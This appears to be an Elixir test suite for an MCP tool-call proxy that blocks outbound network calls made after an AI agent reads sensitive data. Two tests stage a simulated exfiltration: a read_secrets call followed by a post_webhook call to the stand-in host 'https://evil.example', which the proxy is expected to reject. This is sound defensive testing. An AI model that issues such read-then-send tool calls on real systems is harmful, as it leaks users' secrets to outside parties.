defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
  use PhoenixElxirBeamWeb.ConnCase, async: true

  alias PhoenixElxirBeam.MCP.ServerRegistry

  defp with_session(conn, session_id) do
    put_req_header(conn, "mcp-session-id", session_id)
  end

  defp call_body(method, params) do
    %{"jsonrpc" => "2.0", "id" => 1, "method" => method, "params" => params}
  end

  test "a benign tool call is allowed and forwarded to the mock server", %{conn: conn} do
    session_id = "proxy-test-benign-#{System.unique_integer([:positive])}"

    conn =
      conn
      |> with_session(session_id)
      |> post(
        ~p"/mcp/proxy/files",
        call_body("tools/call", %{"name" => "list_files", "arguments" => %{}})
      )

    assert %{"jsonrpc" => "2.0", "id" => 1, "result" => result} = json_response(conn, 200)
    assert %{"isError" => false} = result
  end

  test "a network-egress call following a sensitive read is blocked", %{conn: _conn} do
    session_id = "proxy-test-attack-#{System.unique_integer([:positive])}"

    read_conn =
      build_conn()
      |> with_session(session_id)
      |> post(
        ~p"/mcp/proxy/files",
        call_body("tools/call", %{"name" => "read_secrets", "arguments" => %{}})
      )

    assert %{"result" => _result} = json_response(read_conn, 200)

    webhook_conn =
      build_conn()
      |> with_session(session_id)
      |> post(
        ~p"/mcp/proxy/net",
        call_body("tools/call", %{
          "name" => "post_webhook",
          "arguments" => %{"url" => "https://evil.example", "body" => "x"}
        })
      )

    assert %{"jsonrpc" => "2.0", "id" => 1, "error" => %{"code" => -32001, "message" => message}} =
             json_response(webhook_conn, 200)

    assert is_binary(message)
  end

  test "a registered real server is routed to and enforces manually assigned tags", %{
    conn: conn
  } do
    port = PhoenixElxirBeamWeb.Endpoint.config(:http)[:port]
    base_url = "http://127.0.0.1:#{port}/mcp/servers/files"

    {:ok, server} = ServerRegistry.register_server("External files", base_url)
    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    {:ok, _updated} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])

    session_id = "proxy-test-real-#{System.unique_integer([:positive])}"

    allowed_conn =
      conn
      |> with_session(session_id)
      |> post(
        ~p"/mcp/proxy/#{server.id}",
        call_body("tools/call", %{"name" => "list_files", "arguments" => %{}})
      )

    assert %{"result" => %{"isError" => false}} = json_response(allowed_conn, 200)

    read_conn =
      build_conn()
      |> with_session(session_id)
      |> post(
        ~p"/mcp/proxy/#{server.id}",
        call_body("tools/call", %{"name" => "read_secrets", "arguments" => %{}})
      )

    assert %{"result" => _result} = json_response(read_conn, 200)

    egress_conn =
      build_conn()
      |> with_session(session_id)
      |> post(
        ~p"/mcp/proxy/net",
        call_body("tools/call", %{
          "name" => "post_webhook",
          "arguments" => %{"url" => "https://evil.example", "body" => "x"}
        })
      )

    assert %{"error" => %{"code" => -32001}} = json_response(egress_conn, 200)
  end
end
